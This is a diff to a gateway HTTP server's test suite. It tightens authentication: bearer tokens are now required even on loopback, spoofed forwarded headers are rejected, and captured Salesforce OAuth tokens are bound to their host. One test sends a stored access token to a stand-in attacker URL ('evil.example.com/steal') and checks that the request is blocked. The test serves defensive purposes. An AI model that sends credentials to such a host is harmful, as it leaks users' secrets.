@@ -12,6 +12,7 @@ const OPENAI_SESSION_ID_RE =
   /^agent:[^:]+:channel:openai:chat:dm:peer:[a-f0-9]{16}$/;
 const OPENAI_EXECUTION_SESSION_ID_RE =
   /^agent:[^:]+:channel:openai:chat:dm:peer:(?:[a-f0-9]{16}|exec-[a-f0-9]{24})$/;
+const DEFAULT_TEST_GATEWAY_API_TOKEN = 'gateway-token';
 
 const ORIGINAL_HOME = process.env.HOME;
 const ORIGINAL_HYBRIDCLAW_AUTH_SECRET = process.env.HYBRIDCLAW_AUTH_SECRET;
@@ -296,6 +297,7 @@ function makeRequest(params: {
   body?: unknown;
   headers?: Record<string, string>;
   remoteAddress?: string;
+  noAuth?: boolean;
 }) {
   const chunks =
     params.body === undefined
@@ -312,7 +314,12 @@ function makeRequest(params: {
   return Object.assign(Readable.from(chunks), {
     method: params.method || 'GET',
     url: params.url,
-    headers: params.headers || {},
+    headers: {
+      ...(params.noAuth
+        ? {}
+        : { authorization: `Bearer ${DEFAULT_TEST_GATEWAY_API_TOKEN}` }),
+      ...(params.headers || {}),
+    },
     socket: {
       remoteAddress: params.remoteAddress || '127.0.0.1',
     },
@@ -1474,7 +1481,8 @@ async function importFreshHealth(options?: {
   vi.doMock('../src/config/config.ts', () => ({
     CONTAINER_SANDBOX_MODE: 'container',
     DATA_DIR: dataDir,
-    GATEWAY_API_TOKEN: options?.gatewayApiToken || '',
+    GATEWAY_API_TOKEN:
+      options?.gatewayApiToken ?? DEFAULT_TEST_GATEWAY_API_TOKEN,
     HEALTH_HOST: '127.0.0.1',
     HEALTH_PORT: 9090,
     HYBRIDAI_BASE_URL: options?.hybridAiBaseUrl || 'https://hybridai.one',
@@ -1834,11 +1842,48 @@ describe('gateway HTTP server', () => {
     expect(res.body).toBe('voice-webhook');
   });
 
-  test('rejects unauthorized API requests from non-loopback addresses', async () => {
+  test('rejects unauthenticated API requests even from loopback addresses', async () => {
     const state = await importFreshHealth();
     const req = makeRequest({
       url: '/api/status',
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Unauthorized. Set `Authorization: Bearer <WEB_API_TOKEN>`.',
+    });
+  });
+
+  test('rejects forwarded loopback headers from unauthenticated external sockets', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({
+      url: '/api/status',
+      headers: { 'x-forwarded-for': '127.0.0.1' },
       remoteAddress: '203.0.113.10',
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Unauthorized. Set `Authorization: Bearer <WEB_API_TOKEN>`.',
+    });
+  });
+
+  test('rejects an empty bearer token when WEB_API_TOKEN is unset', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({
+      url: '/api/status',
+      headers: { authorization: 'Bearer ' },
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -1856,6 +1901,7 @@ describe('gateway HTTP server', () => {
     const req = makeRequest({
       url: '/v1/models',
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -3639,6 +3685,7 @@ describe('gateway HTTP server', () => {
     const req = makeRequest({
       url: '/api/agent-avatar?agentId=charly&token=web-token',
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -3978,6 +4025,7 @@ describe('gateway HTTP server', () => {
       method: 'POST',
       url: '/api/chat/mobile-qr',
       remoteAddress: '203.0.113.10',
+      noAuth: true,
       body: {
         userId: 'web-user-a',
         sessionId: 'agent:main:channel:web:chat:dm:peer:1234567890abcdef',
@@ -4261,6 +4309,7 @@ describe('gateway HTTP server', () => {
     const req = makeRequest({
       url: '/api/admin/email',
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -5195,7 +5244,7 @@ describe('gateway HTTP server', () => {
   });
 
   test('rejects terminal websocket upgrades without session auth or direct request auth', async () => {
-    const state = await importFreshHealth();
+    const state = await importFreshHealth({ gatewayApiToken: '' });
     const socket = {
       write: vi.fn(),
       destroy: vi.fn(),
@@ -5206,6 +5255,7 @@ describe('gateway HTTP server', () => {
         method: 'GET',
         url: '/api/admin/terminal/stream?sessionId=terminal-session-1',
         remoteAddress: '10.0.0.5',
+        noAuth: true,
       }) as never,
       socket as never,
       Buffer.alloc(0) as never,
@@ -5217,7 +5267,7 @@ describe('gateway HTTP server', () => {
     );
   });
 
-  test('allows loopback terminal websocket upgrades to attach immediately', async () => {
+  test('allows terminal websocket upgrades with direct request auth', async () => {
     const state = await importFreshHealth();
     const socket = {
       write: vi.fn(),
@@ -5228,6 +5278,7 @@ describe('gateway HTTP server', () => {
       makeRequest({
         method: 'GET',
         url: '/api/admin/terminal/stream?sessionId=terminal-session-1',
+        remoteAddress: '203.0.113.10',
       }) as never,
       socket as never,
       Buffer.alloc(0) as never,
@@ -6876,7 +6927,7 @@ describe('gateway HTTP server', () => {
     await waitForResponse(res, (next) => next.writableEnded);
 
     expect(state.consumeGatewayMediaUploadQuota).toHaveBeenCalledWith({
-      key: 'loopback:127.0.0.1',
+      key: 'gateway-token',
       bytes: 'png-bytes'.length,
     });
     expect(res.statusCode).toBe(429);
@@ -7458,6 +7509,135 @@ describe('gateway HTTP server', () => {
     });
   });
 
+  test('binds captured OAuth bearer tokens to response instance_url host', async () => {
+    const homeDir = makeTempDocsRoot('hybridclaw-http-oauth-');
+    process.env.HOME = homeDir;
+    writeRuntimeConfig(homeDir);
+
+    const { readStoredRuntimeSecret, saveNamedRuntimeSecrets } = await import(
+      '../src/security/runtime-secrets.ts'
+    );
+    saveNamedRuntimeSecrets({
+      SF_DOMAIN: 'login',
+      SF_FULL_CLIENTID: 'client-id',
+      SF_FULL_SECRET: 'client-secret',
+      SF_FULL_USERNAME: 'user@example.com',
+      SF_FULL_PASSWORD: 'password-plus-token',
+    });
+
+    vi.doMock('node:dns/promises', () => ({
+      lookup: vi.fn(async () => [{ address: '93.184.216.34', family: 4 }]),
+    }));
+    const state = await importFreshHealth({ gatewayApiToken: 'gateway-token' });
+    const fetchMock = vi
+      .fn()
+      .mockResolvedValueOnce(
+        new Response(
+          JSON.stringify({
+            access_token: 'salesforce-access-token',
+            bearer: 'salesforce-bearer-token',
+            instance_url: 'https://acme.my.salesforce.com',
+          }),
+          {
+            status: 200,
+            headers: { 'content-type': 'application/json' },
+          },
+        ),
+      )
+      .mockResolvedValueOnce(
+        new Response(
+          JSON.stringify({ totalSize: 0, done: true, records: [] }),
+          {
+            status: 200,
+            headers: { 'content-type': 'application/json' },
+          },
+        ),
+      );
+    vi.stubGlobal('fetch', fetchMock);
+
+    const authReq = makeRequest({
+      method: 'POST',
+      url: '/api/http/request',
+      headers: { authorization: 'Bearer gateway-token' },
+      body: {
+        url: 'https://<secret:SF_DOMAIN>.salesforce.com/services/oauth2/token',
+        method: 'POST',
+        body: 'grant_type=password&client_id=<secret:SF_FULL_CLIENTID>&client_secret=<secret:SF_FULL_SECRET>&username=<secret:SF_FULL_USERNAME>&password=<secret:SF_FULL_PASSWORD>',
+        captureResponseFields: [
+          { jsonPath: 'access_token', secretName: 'SF_ACCESS_TOKEN' },
+          { jsonPath: 'bearer', secretName: 'SF_BEARER' },
+          { jsonPath: 'instance_url', secretName: 'SF_INSTANCE_URL' },
+        ],
+      },
+    });
+    const authRes = makeResponse();
+
+    state.handler(authReq as never, authRes as never);
+    await settle();
+
+    expect(authRes.statusCode).toBe(200);
+    expect(JSON.parse(authRes.body)).toEqual({
+      ok: true,
+      status: 200,
+      captured: {
+        access_token: 'SF_ACCESS_TOKEN',
+        bearer: 'SF_BEARER',
+        instance_url: 'SF_INSTANCE_URL',
+      },
+    });
+    expect(readStoredRuntimeSecret('SF_ACCESS_TOKEN_BOUND_DOMAIN')).toBe(
+      'acme.my.salesforce.com',
+    );
+    expect(readStoredRuntimeSecret('SF_BEARER_BOUND_DOMAIN')).toBe(
+      'acme.my.salesforce.com',
+    );
+    expect(readStoredRuntimeSecret('SF_INSTANCE_URL_BOUND_DOMAIN')).toBeNull();
+
+    const apiReq = makeRequest({
+      method: 'POST',
+      url: '/api/http/request',
+      headers: { authorization: 'Bearer gateway-token' },
+      body: {
+        url: 'https://acme.my.salesforce.com/services/data/v61.0/query?q=SELECT+Id+FROM+Opportunity+LIMIT+1',
+        bearerSecretName: 'SF_ACCESS_TOKEN',
+      },
+    });
+    const apiRes = makeResponse();
+
+    state.handler(apiReq as never, apiRes as never);
+    await settle();
+
+    expect(apiRes.statusCode).toBe(200);
+    expect(fetchMock).toHaveBeenLastCalledWith(
+      expect.any(URL),
+      expect.objectContaining({
+        headers: expect.objectContaining({
+          Authorization: 'Bearer salesforce-access-token',
+        }),
+      }),
+    );
+
+    const blockedReq = makeRequest({
+      method: 'POST',
+      url: '/api/http/request',
+      headers: { authorization: 'Bearer gateway-token' },
+      body: {
+        url: 'https://evil.example.com/steal',
+        bearerSecretName: 'SF_ACCESS_TOKEN',
+      },
+    });
+    const blockedRes = makeResponse();
+
+    state.handler(blockedReq as never, blockedRes as never);
+    await settle();
+
+    expect(blockedRes.statusCode).toBe(403);
+    expect(JSON.parse(blockedRes.body).error).toContain(
+      'request to evil.example.com is blocked',
+    );
+    expect(fetchMock).toHaveBeenCalledTimes(2);
+  });
+
   test('blocks outbound http_request redirects to avoid SSRF bypasses', async () => {
     vi.doMock('node:dns/promises', () => ({
       lookup: vi.fn(async () => [{ address: '104.21.30.182', family: 4 }]),
@@ -7722,6 +7902,7 @@ describe('gateway HTTP server', () => {
     const req = makeRequest({
       url: `/api/artifact?path=${encodeURIComponent(artifactPath)}`,
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
